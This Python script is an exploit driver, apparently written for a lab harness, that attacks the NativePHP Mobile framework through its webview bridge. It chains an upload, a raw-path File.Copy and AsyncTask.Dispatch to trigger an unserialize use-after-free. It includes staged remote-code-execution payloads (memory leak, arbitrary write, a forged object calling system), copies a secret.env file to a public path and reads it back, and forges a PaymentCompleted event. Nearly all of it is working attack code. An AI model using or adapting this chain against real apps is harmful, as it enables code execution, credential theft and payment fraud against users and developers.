#!/usr/bin/env python3
"""
NativePHP Mobile 0-day lab attack driver.

Fires the full framework chain exactly as webview JS would (every request is
a plain HTTP call against the harness — the same shapes that work cross-origin
from a page in the app's webview):

  chain:  POST /upload                        (any app file-save feature)
          POST /_native/api/call  File.Copy   (raw-path copy, framework hole)
          POST /_native/api/call  AsyncTask.Dispatch (runner unserialize)
  exfil:  POST /_native/api/call  File.Copy   (secret -> public/)
          GET  /_assets/leak.txt              (asset handler serves it back)
  events: POST /_native/api/events            (PaymentCompleted forgery)
"""
import json
import sys
import urllib.request
import urllib.parse

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8811"
LAB = sys.argv[2] if len(sys.argv) > 2 else "/mnt/c/Users/andre/Downloads/php2shell-claude/nativephp_lane/lab"
TASK = "f47ac10b-58cc-4372-a567-0e02b2c3d479"


def post(path, data=None, headers=None, raw=False):
    url = BASE + path
    if raw:
        body = data
    else:
        body = urllib.parse.urlencode(data, doseq=True).encode()
    req = urllib.request.Request(url, data=body, headers=headers or {})
    with urllib.request.urlopen(req, timeout=60) as r:
        return r.status, r.read().decode("utf-8", "replace")


def get(path):
    with urllib.request.urlopen(BASE + path, timeout=30) as r:
        return r.status, r.read().decode("utf-8", "replace")


def build_vd_payload():
    """vd1b trigger (poc_matrix/vd1b_dupkey_ok.php) adapted to the harness
    gadget class: 1020 elements, duplicate-key overwrite at the tail makes
    the object slot-owned; its destructor re-enters unserialize during
    var_destroy -> var_push on the freed entries block (UAF write)."""
    els = [f"i:{k};i:1;" for k in range(1018)]
    els.append('i:1018;O:15:"AppCacheFlusher":0:{}')
    els.append("i:1018;i:5;")
    return "a:1020:{" + "".join(els) + "}"


def build_stage_payload(cls, addr, base):
    """Staged RCE payload: trigger object carries the stage class + baked
    addresses as object properties (attacker controls only spool bytes, so
    leaked/calibrated addresses ride in the payload itself). base ints are
    compensated for the property push (empirically swept)."""
    els = [f"i:{k};i:1;" for k in range(base)]
    els.append(f'i:9998;O:{len(cls)}:"{cls}":1:{{s:4:"addr";s:{len(addr)}:"{addr}";}}')
    els.append("i:9998;i:5;")
    return f"a:{base + 2}:{{" + "".join(els) + "}"


def dispatch_task(payload, task_id):
    """Full framework delivery: persist bytes -> raw File.Copy into the
    async spool -> AsyncTask.Dispatch. Returns the runner result dict."""
    st, body = post("/upload", payload.encode(), {"X-Filename": "user-content.bin"}, raw=True)
    up = json.loads(body)["path"]
    spool = f"{LAB}/storage/framework/async/payload/{task_id}.task"
    st, body = bridge("File.Copy", {"from": up, "to": spool})
    assert json.loads(body)["data"]["success"] is True, "File.Copy failed"
    st, body = bridge("AsyncTask.Dispatch", {"id": task_id})
    return json.loads(body)["data"]


def fmt_addr(*vals):
    """Fixed-width 15-digit zero-padded decimal components — identical
    payload shape across all stages and the calibration run."""
    return "|".join(f"{v:015d}" for v in vals)


def rce(base, chunk, base_addr, d, dtor):
    """vdR chain through the NativePHP delivery: leak -> write -> call."""
    addr = fmt_addr(chunk, base_addr, d, dtor)
    print("=== RCE stage: LEAK (qword oracle through the framework delivery) ===")
    out = dispatch_task(build_stage_payload("NativeAsyncLeak", addr, base), "nphp-leak--0000000000000000000001")
    print(out["runner_out"][:3000])
    print("runner_exit =", out["runner_exit"])

    print("\n=== RCE stage: WRITE (16-byte arbitrary write) ===")
    out = dispatch_task(build_stage_payload("NativeAsyncWrite", addr, base), "nphp-write-0000000000000000000001")
    print(out["runner_out"][:3000])
    print("runner_exit =", out["runner_exit"])

    print("\n=== RCE stage: CALL (forged zend_object -> zif_system) ===")
    out = dispatch_task(build_stage_payload("NativeAsyncCall", addr, base), "nphp-call--0000000000000000000001")
    print(out["runner_out"][:3000])
    print("runner_exit =", out["runner_exit"])


def bridge(method, params):
    """Cross-origin 'simple request' shape: form-encoded POST — no CORS
    preflight, fires from any origin page inside the app's webview."""
    data = {"method": method}
    for k, v in params.items():
        data[f"params[{k}]"] = v
    return post("/_native/api/call", data)


def chain():
    print("=== stage 1: persist attacker bytes (app file-save feature) ===")
    payload = build_vd_payload()
    st, body = post("/upload", payload.encode(), {"X-Filename": "user-content.bin"}, raw=True)
    print(st, body)
    up = json.loads(body)["path"]

    print("\n=== stage 2: File.Copy raw-path (framework bridge hole) ===")
    spool = f"{LAB}/storage/framework/async/payload/{TASK}.task"
    st, body = bridge("File.Copy", {"from": up, "to": spool})
    print(st, body)
    assert json.loads(body)["data"]["success"] is True, "File.Copy failed"

    print("\n=== stage 3: AsyncTask.Dispatch -> runner lane unserialize ===")
    st, body = bridge("AsyncTask.Dispatch", {"id": TASK})
    out = json.loads(body)["data"]
    print("runner_exit =", out["runner_exit"])
    print("runner_bin =", out.get("runner_bin"))
    print("runner_alloc =", out.get("runner_alloc"))
    print("--- runner output ---")
    print(out["runner_out"][:6000])
    return out


def exfil():
    print("=== standalone critical: arbitrary sandbox file exfiltration ===")
    st, body = bridge("File.Copy", {
        "from": f"{LAB}/storage/app/secret.env",
        "to": f"{LAB}/public/leak.txt",
    })
    print("File.Copy:", st, body)
    st, body = get("/_assets/leak.txt")
    print("GET /_assets/leak.txt:", st)
    print("EXFILTRATED:", body.strip())


def events():
    print("=== standalone critical: event forgery ===")
    data = json.dumps({
        "event": "App\\Events\\PaymentCompleted",
        "payload": {"orderId": "FORGED-BY-ATTACKER-9", "amount": 0.01},
    }).encode()
    st, body = post("/_native/api/events", data, {"Content-Type": "application/json"}, raw=True)
    print(st, body)


if __name__ == "__main__":
    mode = sys.argv[3] if len(sys.argv) > 3 else "all"
    if mode in ("chain", "all"):
        chain()
    if mode in ("exfil", "all"):
        exfil()
    if mode in ("events", "all"):
        events()
    if mode == "rce":
        # argv: base chunk base_addr d dtor
        rce(int(sys.argv[4]), int(sys.argv[5]), int(sys.argv[6]),
            int(sys.argv[7]), int(sys.argv[8]))
    if mode == "calib":
        # Controlled-pointer receipt: calib-stage payload through the full
        # HTTP delivery (upload -> File.Copy -> AsyncTask.Dispatch), runner
        # under gdb. Receipt = SIGSEGV in php_var_unserialize with
        # rax = 0x4242424242424242 (attacker-chosen pointer, ASLR-free).
        base = int(sys.argv[4])
        out = dispatch_task(build_stage_payload("NativeAsyncCalib", "0" * 64, base),
                            "nphp-calib-0000000000000000000001")
        print(out["runner_out"][:4000])
        print("runner_exit =", out["runner_exit"])
